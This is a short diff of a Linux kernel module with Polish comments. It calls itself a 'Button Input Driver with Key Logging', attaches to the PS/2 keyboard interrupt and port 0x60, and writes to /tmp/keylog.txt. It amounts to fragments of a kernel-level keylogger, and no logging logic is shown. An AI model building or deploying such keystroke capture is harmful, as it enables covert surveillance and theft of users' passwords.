@@ -19,13 +19,12 @@ MODULE_LICENSE("GPL");
 MODULE_AUTHOR("Your Name");
 MODULE_DESCRIPTION("Button Input Driver with Key Logging");
 
-#define BUTTON_IRQ 1 // IRQ klawiatury PS/2
+#define BUTTON_IRQ 1     // IRQ klawiatury PS/2
+#define BUTTON_PORT 0x60 // Port klawiatury PS/2
 #define LOG_FILE_PATH "/tmp/keylog.txt"
 
 static struct input_dev *button_dev;
 const char *uniqueId;
-
-m m
 
     // Funkcja zapisująca dane do pliku logu
     static void
@@ -79,7 +78,6 @@ static irqreturn_t button_interrupt(int irq, void *dummy)
 static int __init button_init(void)
 {
 
-    uniqueId = getOrCreateUniqueId(); // Generowanie unikalnego identyfikatora
     int error;
 
     // Zarejestruj przerwanie
